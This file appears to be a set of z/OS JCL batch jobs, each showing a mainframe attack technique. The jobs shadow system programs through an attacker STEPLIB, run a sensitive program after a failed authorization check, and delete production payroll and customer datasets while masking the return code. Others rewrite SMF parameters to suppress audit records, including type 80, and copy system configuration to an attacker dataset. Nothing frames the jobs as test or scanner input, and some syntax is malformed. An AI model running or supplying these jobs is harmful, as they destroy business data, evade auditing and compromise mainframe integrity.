

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//TROJSTEP JOB (BATCH01),'STEPLIB TROJAN',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IEFBR14,REGION=4096K
//STEPLIB  DD DISP=SHR,DSN=ATTACKER.LOAD.LIBRARY  
//         DD DISP=SHR,DSN=SYS1.LINKLIB           
//         DD DISP=SHR,DSN=SYS1.SVCLIB
//* Any program in ATTACKER.LOAD.LIBRARY shadows the same-named
//* program in SYS1.LINKLIB - classic trojan horse technique

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//UNLIMREG JOB (BATCH01),'UNLIMITED REGION',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=MYPGM,
//             REGION=0M                   
//SYSPRINT DD SYSOUT=*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//CONDBYP  JOB (BATCH01),'COND BYPASS',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=VALIDATE,REGION=2048K  /* Authorization check */
//SYSPRINT DD SYSOUT=*
//STEP020  EXEC PGM=SENSITIV,              
//             COND=EVEN,                 
//             REGION=4096K
//SYSPRINT DD SYSOUT=*
//STEP030  EXEC PGM=CLEANUP,
//             COND=(0,NE,STEP010),        
//             COND=(4,LT),EVEN            

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//DELETES  JOB (BATCH01),'DELETE PROD DS',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IDCAMS
//SYSPRINT DD SYSOUT=*
//SYSIN    DD *
  DELETE PROD.PAYROLL.MASTERFILE CLUSTER 
  DELETE PROD.CUSTOMER.VSAM CLUSTER       
  SET MAXCC=0
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//MODPARM  JOB (BATCH01),'MOD PARMLIB',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IEBUPDTE,PARM=NEW
//SYSPRINT DD SYSOUT=*
//SYSUT2   DD DISP=SHR,DSN=SYS1.PARMLIB(SMFPRM00) 
//SYSIN    DD *
./ ADD NAME=SMFPRM00
SID(PROD)
ACTIVE
NOTYPE(80,30,64)                         
JWT(0000)
/*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//REALADDR JOB (BATCH01),'REAL STORAGE',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=MYPGM,
//             ADDRSPC=REAL,              
//             REGION=4096K
//SYSPRINT DD SYSOUT=*

//*--------------------------------------------------------------------

//*--------------------------------------------------------------------
//COPYRUN  JOB (BATCH01),'TYPRUN COPY',CLASS=A,NOTIFY=&SYSUID
//STEP010  EXEC PGM=IEBGENER,TYPRUN=COPY 
//SYSPRINT DD SYSOUT=*
//SYSUT1   DD DISP=SHR,DSN=SYS1.PARMLIB(IEASYS00)  
//SYSUT2   DD DSN=ATTACKER.IEASYS.COPY,
//            DISP=(NEW,CATLG,DELETE),
//            SPACE=(TRK,(5,1))
//SYSIN    DD DUMMY


